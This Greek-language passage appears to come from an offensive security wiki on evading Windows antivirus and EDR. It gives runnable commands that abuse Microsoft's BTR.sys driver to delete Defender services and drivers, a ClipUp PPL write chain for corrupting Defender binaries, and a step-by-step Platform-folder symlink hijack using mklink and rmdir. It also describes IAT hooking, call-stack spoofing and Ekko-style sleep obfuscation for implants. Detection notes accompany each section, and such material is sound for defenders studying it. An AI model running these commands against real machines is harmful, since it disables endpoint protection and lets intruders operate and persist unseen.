Το πρόγραμμα οδήγησης **Boot-Time Removal** του Defender αποτελεί χρήσιμο αντίπαλο παράδειγμα στο κλασικό BYOVD. Το `BTR.sys` είναι ένα νόμιμο στοιχείο αποκατάστασης υπογεγραμμένο από τη Microsoft, χωρίς σφάλμα καταστροφής μνήμης και χωρίς διεπαφή IOCTL· αφού αποκτήσει πρόσβαση διαχειριστή και `SeLoadDriverPrivilege`, ένας χειριστής μπορεί, αντί γι’ αυτό, να πλαστογραφήσει την ιδιωτική συναλλαγή αποκατάστασής του και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/μητρώου Ring-0. Πρόκειται για **primitive εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι για αρχική πρόσβαση ή κλιμάκωση προνομίων**, ενώ το πρόγραμμα οδήγησης μπορεί να εξαχθεί από τον πόρο `BOOTTIMETOOL` του `MpEngine.dll` του ίδιου του στόχου, αντί να εισαχθεί ένα εμφανώς ύποπτο πρόγραμμα οδήγησης τρίτου μέρους.<sup>[[36]](#references)</sup>

### Προετοιμασία του εφάπαξ προγράμματος οδήγησης

Κανονικά, το Defender αποθηκεύει τον πόρο ως αρχείο `[a-z]{8}.sys` με τυχαίο όνομα και καταχωρίζει μια υπηρεσία kernel με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της υπηρεσίας, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, γράφει τα δεδομένα επιστροφής και, μετά την επιτυχή εκτέλεση, επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`), ώστε το πρόγραμμα οδήγησης να αποφορτωθεί και να μην παραμείνει φορτωμένο. Μια πλαστογραφημένη υπηρεσία έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα build που αναλύθηκαν επαναχρησιμοποιούν ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει καθολική κεφαλίδα 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και transaction ID που προκύπτει από το payload), ακολουθούμενη από μια διαδρομή feedback UTF-16 με τερματισμό null και οποιονδήποτε αριθμό στοιχείων. Κάθε στοιχείο έχει κεφαλίδα 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και δεδομένα ειδικά για την ενέργεια, τα οποία τελειώνουν με **ακριβώς τέσσερα byte NUL**. Κάθε περιοχή κεφαλίδας/δεδομένων ελέγχεται ανεξάρτητα με CRC-32, πολυώνυμο `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC επαναφέρεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά action ID εκθέτουν αυτές τις primitive λειτουργίες του kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα στοιχείου | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, ακόμη και αν είναι κλειδωμένο |
| 2 | `[UTF-16 path]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε προστατευμένη διαδρομή που έχει επιλέξει ο attacker· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Αναδρομική διαγραφή κλειδιού registry |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή τιμής registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση τιμής registry και δημιουργία διαδρομών κλειδιών που λείπουν |

Για τις ενέργειες 5 και 6, ο διαχωριστής κλειδιού/τιμής στο wire είναι **δύο διαδοχικά backslash**· μια διαδρομή με τη συμβατική μορφοποίηση δεν θα διαχωριστεί σωστά. Το αρχείο feedback αντικατοπτρίζει κυρίως το αίτημα, αλλά τα πρώτα τέσσερα byte των δεδομένων κάθε στοιχείου γίνονται το αντίστοιχο `NTSTATUS`. Για τις ενέργειες 1 και 2, που δεν έχουν αρχικό πεδίο flags, το BTR μετατοπίζει τη διαδρομή στα τέσσερα δεσμευμένα τελικά byte, ώστε να δημιουργήσει χώρο για αυτήν την κατάσταση.<sup>[[36]](#references)</sup>

### Ροή εργασίας `BTR_CLI` και παράθυρο πρώιμης εκκίνησης

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των `<random>.sys:changelist` και ενός stream feedback, σειριοποίηση/υπολογισμό checksum/κρυπτογράφηση αλυσιδωτών ενεργειών, απευθείας δημιουργία του κλειδιού registry της υπηρεσίας και, στη συνέχεια, κλήση του `NtLoadDriver` για `-trigger now` ή διατήρησή του ως driver εκκίνησης συστήματος για `-trigger boot`. Η απευθείας προετοιμασία του registry παρακάμπτει τη συνήθη διαδρομή SCM `CreateServiceW` και επομένως **δεν** δημιουργεί συμβάν εγκατάστασης υπηρεσίας με Event ID 7045. Τα τεχνουργήματα που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` δεν είναι αξιοποιήσιμο, επειδή το BTR εκτελεί λειτουργίες I/O αρχείων από το `DriverEntry` πριν να είναι έτοιμα το storage stack και ο σύνδεσμος `SystemRoot`. Το `Start=1` μαζί με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender` εκτελείται αντίθετα στη Phase 1: το NTFS είναι διαθέσιμο, αλλά πολλά security drivers που ξεκινούν από το σύστημα και υπηρεσίες EDR σε user mode δεν έχουν αρχικοποιηθεί. Τα φίλτρα boot-start, όπως το `WdFilter`, μπορεί να έχουν ήδη φορτωθεί, ωστόσο το BTR μπορεί να αφαιρέσει τα δυαδικά αρχεία τους ή τη διαμόρφωση της υπηρεσίας πριν από την επόμενη εκκίνηση, καθώς και να διαγράψει τα εκτελέσιμα αρχεία υπηρεσιών πριν τα εκκινήσει το SCM. Το ELAM δεν κλείνει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση boot-start και φέρει έγκυρη υπογραφή Microsoft.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC προσθέτει στην αρχή την Action 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το αρχείο καταγραφής, έπειτα εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την αποφόρτωσή του. Έτσι μειώνονται τα αποδεικτικά στοιχεία, ενώ η αποθήκευση της ανατροφοδότησης στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του driver και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης υψηλής ευκρίνειας

Οι κανόνες που βασίζονται μόνο σε υπογραφές και η λίστα αποκλεισμού ευάλωτων drivers της Microsoft δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τις παρακάτω συμπεριφορικές συσχετίσεις, διακρίνοντας παράλληλα τη νόμιμη προέλευση από το Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολική στο staging του BTR. Ένα ADS `.dat` συνδεδεμένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το νόμιμο Defender συνήθως τοποθετεί τα δεδομένα ανατροφοδότησης κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** Συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>` που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender` με την απουσία αντίστοιχου συμβάντος εγκατάστασης SCM.
- **Sysmon 6 -> 23:** Συσχετίστε τη φόρτωση γνωστού BTR driver από προέλευση εκτός Defender με επακόλουθη διαγραφή αρχείου που αποδίδεται στο `System`/PID 4, ιδιαίτερα όταν πρόκειται για δυαδικά αρχεία ασφαλείας.
- **Sysmon 11 -> 23:** Ενεργοποιήστε ειδοποίηση για τη γρήγορη δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγχετε την εκχώρηση/ενεργοποίηση του `SeLoadDriverPrivilege`. Μια υπογραφή Microsoft από μόνη της δεν αρκεί ως ένδειξη εμπιστοσύνης όταν ένας driver εργαλείου ασφαλείας γίνεται staging από το `cmd.exe`, το PowerShell ή μια άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για παραποίηση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία υπογραφών/επιπέδων, ώστε μόνο διεργασίες ίδιου ή υψηλότερου επιπέδου προστασίας να μπορούν να παραποιούν η μία την άλλη. Από επιθετική σκοπιά, αν μπορείτε να εκκινήσετε νόμιμα ένα binary με ενεργοποιημένο PPL και να ελέγχετε τα ορίσματά του, μπορείτε να μετατρέψετε καλοήθη λειτουργικότητα (π.χ. καταγραφή) σε ένα περιορισμένο primitive εγγραφής με υποστήριξη PPL, το οποίο στοχεύει προστατευμένους καταλόγους που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι απαιτείται για να εκτελεστεί μια διεργασία ως PPL
- Το EXE-στόχος (και τυχόν φορτωμένα DLL) πρέπει να είναι υπογεγραμμένα με EKU που υποστηρίζει PPL.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τις σημαίες: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό επίπεδο προστασίας, το οποίο να αντιστοιχεί στην υπογραφή του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για υπογραφές anti-malware, `PROTECTION_LEVEL_WINDOWS` για υπογραφές Windows). Λανθασμένα επίπεδα θα προκαλέσουν αποτυχία κατά τη δημιουργία.

Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και την προστασία LSASS εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Βοηθητικό εργαλείο ανοικτού κώδικα: CreateProcessAsPPL (επιλέγει το επίπεδο προστασίας και προωθεί τα ορίσματα στο EXE-στόχο):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο δυαδικό αρχείο συστήματος `C:\Windows\System32\ClipUp.exe` εκκινεί τον εαυτό του και δέχεται μια παράμετρο για να γράψει ένα αρχείο καταγραφής σε διαδρομή που καθορίζει ο καλών.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή του αρχείου πραγματοποιείται με υποστήριξη PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε σύντομες διαδρομές 8.3 για να δείξετε σε συνήθως προστατευμένες τοποθεσίες.

Βοηθητικά εργαλεία για σύντομες διαδρομές 8.3
- Εμφάνιση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Εύρεση σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Αλυσίδα κατάχρησης (αφηρημένη)
1) Εκκινήστε το LOLBIN που υποστηρίζει PPL (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ., CreateProcessAsPPL).
2) Περάστε το όρισμα διαδρομής αρχείου καταγραφής του ClipUp για να εξαναγκάσετε τη δημιουργία αρχείου σε έναν προστατευμένο κατάλογο AV (π.χ., Defender Platform). Χρησιμοποιήστε σύντομα ονόματα 8.3, αν χρειάζεται.
3) Αν το AV έχει συνήθως ανοιχτό/κλειδωμένο το δυαδικό αρχείο-στόχο όσο εκτελείται (π.χ., MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας μια υπηρεσία αυτόματης εκκίνησης που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (καταγραφή εκκίνησης).
4) Μετά την επανεκκίνηση, η εγγραφή με υποστήριξη PPL πραγματοποιείται πριν το AV κλειδώσει τα δυαδικά αρχεία του, καταστρέφοντας το αρχείο-στόχο και εμποδίζοντας την εκκίνηση.

Παράδειγμα κλήσης (οι διαδρομές έχουν αφαιρεθεί ή συντομευτεί για λόγους ασφαλείας):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp, παρά μόνο τη θέση τους· το primitive είναι κατάλληλο για αλλοίωση και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα διαχειριστή/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας, καθώς και ένα χρονικό περιθώριο για επανεκκίνηση.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα file locks.

Εντοπισμοί
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν έχει ως γονέα μη τυπικούς launchers, κοντά στην εκκίνηση.
- Νέες υπηρεσίες που έχουν ρυθμιστεί να ξεκινούν αυτόματα ύποπτα binaries και ξεκινούν σταθερά πριν από το Defender/AV. Εξετάστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για τα binaries/τους καταλόγους Platform του Defender· απρόσμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- Τηλεμετρία ETW/EDR: αναζητήστε διεργασίες που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδων PPL από binaries που δεν σχετίζονται με AV.

Μετριασμοί
- WDAC/Code Integrity: περιορίστε ποια υπογεγραμμένα binaries μπορούν να εκτελούνται ως PPL και από ποιους γονείς· αποκλείστε την κλήση του ClipUp εκτός νόμιμων περιπτώσεων.
- Υγιεινή υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολουθείτε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι είναι ενεργοποιημένες οι προστασίες του Defender από αλλοίωση και οι προστασίες πρώιμης εκκίνησης· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Εξετάστε το ενδεχόμενο απενεργοποίησης της δημιουργίας σύντομων ονομάτων 8.3 σε τόμους που φιλοξενούν εργαλεία ασφαλείας, εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε το διεξοδικά).

## Αλλοίωση του Microsoft Defender μέσω κατάληψης Symlink του φακέλου Platform Version

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους του:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφικά συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`) και, στη συνέχεια, εκκινεί από εκεί τις διεργασίες της υπηρεσίας Defender (ενημερώνοντας ανάλογα τις διαδρομές της υπηρεσίας/του registry). Αυτή η επιλογή εμπιστεύεται τις εγγραφές καταλόγου, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας διαχειριστής μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από επιτιθέμενο και να επιτύχει DLL sideloading ή διακοπή λειτουργίας της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προαπαιτούμενα
- Τοπικός Administrator (απαιτείται για τη δημιουργία καταλόγων/symlinks μέσα στον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης νέας επιλογής πλατφόρμας από το Defender (επανεκκίνηση της υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (`mklink`)

Γιατί λειτουργεί
- Το Defender αποκλείει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις εγγραφές καταλόγου και επιλέγει την έκδοση με τη μεγαλύτερη λεξικογραφικά τιμή χωρίς να επικυρώνει αν ο προορισμός αντιστοιχεί σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοιμάστε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα symlink καταλόγου νεότερης έκδοσης μέσα στο Platform, που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή Trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή της διεργασίας στο `C:\TMP\AV\` και τη διαμόρφωση της υπηρεσίας/το registry που αντικατοπτρίζουν αυτήν την τοποθεσία.

Επιλογές post-exploitation
- DLL sideloading/εκτέλεση κώδικα: Τοποθετήστε/αντικαταστήστε DLL που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός υπηρεσίας/άρνηση υπηρεσίας: Καταργήστε το symlink της έκδοσης, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτύχει να ξεκινήσει:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της κλιμάκωση προνομίων· απαιτεί δικαιώματα διαχειριστή.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module, κάνοντας hooking στον Import Address Table (IAT) του και δρομολογώντας επιλεγμένα API μέσω attacker-controlled, position-independent code (PIC). Αυτό γενικεύει το evasion πέρα από το περιορισμένο σύνολο API που εκθέτουν πολλά kits (π.χ., CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Τοποθετήστε ένα PIC blob μαζί με το target module χρησιμοποιώντας έναν reflective loader (ως πρόθεμα ή συνοδευτικό). Το PIC πρέπει να είναι self-contained και position-independent.
- Καθώς φορτώνεται το host DLL, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR και τροποποιήστε τις εγγραφές IAT των στοχευμένων imports (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε λεπτά PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν καλέσει με tail-call την πραγματική διεύθυνση API. Συνήθεις evasions περιλαμβάνουν:
  - Mask/unmask μνήμης γύρω από την κλήση (π.χ., κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και επαναφορά μετά την κλήση.
  - Call-stack spoofing: κατασκευάστε ένα benign stack και μεταβείτε στο target API, ώστε η ανάλυση call-stack να καταλήγει στα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για συμβατότητα, εξαγάγετε ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να καταχωρίζει ποια API θα γίνεται hook για Beacon, BOFs και post-ex DLLs.

Γιατί IAT hooking εδώ
- Λειτουργεί για κάθε κώδικα που χρησιμοποιεί το hooked import, χωρίς τροποποίηση του κώδικα του εργαλείου ή εξάρτηση από το Beacon για proxy συγκεκριμένων API.
- Καλύπτει post-ex DLLs: το hooking στα LoadLibrary* σάς επιτρέπει να παρεμβάλλεστε στη φόρτωση modules (π.χ., System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση post-ex εντολών που δημιουργούν διεργασίες, ενάντια σε detections που βασίζονται στο call-stack, μέσω wrapping των CreateProcessA/W.

Ελάχιστο IAT hook προσχέδιο (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τα relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr δείχνουν πώς γίνεται hooking κατά τη διάρκεια του DllMain του φορτωμένου module.
- Διατηρήστε τα wrappers μικρά και ασφαλή για PIC. Επιλύστε το πραγματικό API μέσω της αρχικής τιμής IAT που καταγράψατε πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποιήστε μεταβάσεις RW → RX για PIC και μην αφήνετε σελίδες ταυτόχρονα εγγράψιμες και εκτελέσιμες.

Stub πλαστογράφησης call stack
- Τα PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη αλυσίδα κλήσεων (με διευθύνσεις επιστροφής σε benign modules) και έπειτα κάνουν pivot στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδυάστε το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγετε στα αναμενόμενα frames πριν από το prologue του API.

Επιχειρησιακή ενσωμάτωση
- Τοποθετήστε τον reflective loader πριν από τα post-ex DLLs, ώστε τα PIC και τα hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποιήστε ένα Aggressor script για να καταχωρίσετε τα APIs-στόχους, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion, χωρίς αλλαγές στον κώδικα.

Σκέψεις για Detection/DFIR
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις non-image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: διευθύνσεις επιστροφής που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε non-image PIC· ασυνεπής καταγωγή RtlUserThreadStart.
- Τηλεμετρία loader: εγγραφές εντός διεργασίας στην IAT, πρώιμη δραστηριότητα DllMain που τροποποιεί import thunks, απρόσμενες περιοχές RX που δημιουργούνται κατά τη φόρτωση.
- Evasion φόρτωσης image: αν γίνεται hooking στο LoadLibrary*, παρακολουθήστε ύποπτες φορτώσεις automation/clr assemblies που συσχετίζονται με συμβάντα masking μνήμης.

Σχετικά δομικά στοιχεία και παραδείγματα
- Reflective loaders που κάνουν IAT patching κατά τη φόρτωση (π.χ. TitanLdr, AceLdr)
- Hooks masking μνήμης (π.χ. simplehook) και PIC για stack cutting (stackcutting)
- PIC stubs για πλαστογράφηση call stack (π.χ. Draugr)


## IAT Hooking κατά τη φόρτωση + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks κατά τη φόρτωση μέσω resident PICO

Αν ελέγχετε έναν reflective loader, μπορείτε να κάνετε hooking στα imports **κατά τη διάρκεια** του `ProcessImports()`, αντικαθιστώντας τον δείκτη `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιουργήστε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφού το transient loader PIC αποδεσμεύσει τη μνήμη του.
- Εξαγάγετε μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ., `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παραλείψτε τα ordinal imports και χρησιμοποιήστε ένα hash-based hook lookup, όπως το `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επιστρέψτε το· διαφορετικά, καλέστε τον πραγματικό `GetProcAddress`.
- Καταχωρίστε τους hook targets κατά το linking με entries `addhook "MODULE$Func" "hook"` του Crystal Palace. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι επιτυγχάνεται **ανακατεύθυνση IAT κατά τη φόρτωση**, χωρίς patching στο code section του φορτωμένου DLL μετά τη φόρτωση.

### Επιβολή imports που επιδέχονται hooking όταν ο στόχος χρησιμοποιεί PEB-walking

Τα hooks κατά τη φόρτωση ενεργοποιούνται μόνο αν η συνάρτηση βρίσκεται πράγματι στην IAT του στόχου. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), επιβάλετε ένα πραγματικό import, ώστε να το εντοπίσει η διαδρομή `ProcessImports()` του loader:

- Αντικαταστήστε την επίλυση hashed exports (π.χ., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά, όπως `&WaitForSingleObject`.
- Ο compiler δημιουργεί ένα IAT entry, επιτρέποντας την παρεμβολή κατά την επίλυση των imports από τον reflective loader.

### Sleep/idle obfuscation τύπου Ekko χωρίς patching στο `Sleep()`

Αντί να κάνετε patch στο `Sleep`, κάντε hooking στα **πραγματικά wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλες αναμονές, τυλίξτε την κλήση σε μια αλυσίδα obfuscation τύπου Ekko, η οποία κρυπτογραφεί το image στη μνήμη κατά την αδράνεια:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποιήστε το `CreateTimerQueueTimer` για να προγραμματίσετε μια ακολουθία callbacks που καλούν το `NtContinue` με κατασκευασμένα frames `CONTEXT`.
- Τυπική αλυσίδα (x64): ορίστε το image ως `PAGE_READWRITE` → κρυπτογραφήστε με RC4 μέσω του `advapi32!SystemFunction032` ολόκληρο το mapped image → εκτελέστε την blocking wait → αποκρυπτογραφήστε με RC4 → **επαναφέρετε τα δικαιώματα ανά section** κάνοντας walk στα PE sections → σηματοδοτήστε την ολοκλήρωση.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`. Κλωνοποιήστε το σε πολλαπλά frames και ορίστε registers (`Rip/Rcx/Rdx/R8/R9`) για να καλέσετε κάθε βήμα.

Λειτουργική λεπτομέρεια: επιστρέψτε «success» για μεγάλες αναμονές (π.χ., `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει ενώ το image είναι masked. Αυτό το μοτίβο κρύβει το module από scanners κατά τα idle windows και αποφεύγει το κλασικό signature του «patched `Sleep()`».

Ιδέες για detection (με βάση την τηλεμετρία)
- Ριπές callbacks `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους image.
- `VirtualProtect` σε μεγάλο εύρος, ακολουθούμενο από προσαρμοσμένη επαναφορά δικαιωμάτων ανά section.

### Runtime καταχώριση CFG για gadgets sleep-obfuscation

